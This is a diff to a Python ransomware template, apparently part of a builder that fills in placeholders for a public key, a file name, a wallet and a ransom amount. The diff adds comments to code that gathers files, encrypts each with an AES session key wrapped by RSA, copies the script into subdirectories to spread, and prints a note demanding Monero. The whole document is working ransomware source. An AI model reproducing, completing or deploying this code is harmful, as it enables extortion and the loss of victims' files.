@@ -35,12 +35,14 @@ from subprocess import Popen, PIPE
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 
+# Public key goes here
 encoded_key = {pubkey_encoded}
 public_key = base64.b64decode(encoded_key)
 
+# Get a list of files
 files = []
-subdir = []
 
+# The encryption function
 def encrypt(datafile, publickey):
     datafile = str(datafile)
     with open(datafile, "rb") as f:
@@ -61,6 +63,7 @@ def encrypt(datafile, publickey):
     with open(encryptedFile, "wb") as thefile:
         [ thefile.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
 
+# Gather the files
 def gather():
     for file in os.listdir():
         if os.path.isfile(file):
@@ -74,16 +77,19 @@ def gather():
 
 gather()
 
+# This way the payload encrypts everything in subdirectories
 subdir = []
 
 # Change this if compiling an executable
 cmd = "python3 {filename}"
 
+#Start with the current directory
 for dir in os.listdir("."):
     d = os.path.join(".", dir)
     if os.path.isdir(dir):
         subdir.append(dir)
 
+# Spread the malware to subdirectories
 for item in subdir:
     subdir = "".join(item)
     shutil.copy("{filename}", item)
@@ -92,9 +98,10 @@ for item in subdir:
     print("Files encrypted...")
     os.chdir("..")
 
+# Demand the ransom
 wallet = '''{wallet}'''
 message = '''
-Looks like someone was stupid enough to download my ransomware.
+Looks like someone downloaded my ransomware.
 Send {quantity} XMR to the wallet provided.
 '''
 
